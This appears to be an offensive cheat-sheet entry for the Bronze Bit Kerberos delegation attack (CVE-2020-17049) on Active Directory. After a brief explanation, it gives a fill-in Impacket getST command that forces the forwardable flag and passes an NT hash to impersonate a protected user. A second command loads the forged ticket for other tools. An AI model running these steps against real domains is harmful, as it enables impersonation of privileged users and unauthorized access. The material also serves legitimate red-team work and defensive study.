---
technique: BronzeBit
category: kerberos-delegation
targets: Domain User, Service Account
protocols: Kerberos
remote_capable: true
tags: kerberos delegation bronze-bit cve-2020-17049 s4u2proxy forwardable ad
---

# Bronze Bit (CVE-2020-17049)

S4U2proxy normally requires an additional service ticket with the `forwardable` flag set as evidence. That flag is absent when the impersonated user is in the Protected Users group or is marked sensitive for delegation, or when constrained delegation is configured in Kerberos-only mode (without protocol transition). CVE-2020-17049 allows an attacker to flip the `forwardable` bit in the additional ticket, bypassing these restrictions and completing the S4U2proxy exchange. The attack requires knowledge of the service account's NT hash.

## Windows

No dedicated Windows-native tooling covers the bit-flip directly; use getST from Linux or pass the resulting ticket to Rubeus for injection.

## Linux

Impacket's getST handles the bit-flip with the `-force-forwardable` flag, performing the full S4U chain in one step.

### Step 1: getST (force-forwardable)

#python #impacket #s4u #pth

Perform a constrained or RBCD S4U exchange while forcibly setting the forwardable flag to bypass Protected Users and Kerberos-only restrictions.

```sh title:"Bronze Bit attack via Impacket getST --force-forwardable"
getST.py -force-forwardable -spn "$target_spn" -impersonate "$impersonate_user" -dc-ip "$rhost_ip" -hashes "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" "$domain"/"$kcd_account"
```
<!-- cheat
import domain_ip
import users
var dc_ip
var target_spn
var impersonate_user
var nt_hash
var domain
var kcd_account
-->

### Step 2: Set KRB5CCNAME to impersonation ticket

#shell #env

Set KRB5CCNAME to the ccache written by getST.py so subsequent Kerberos tools use the impersonation ticket.

```sh title:"Load getST.py ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->
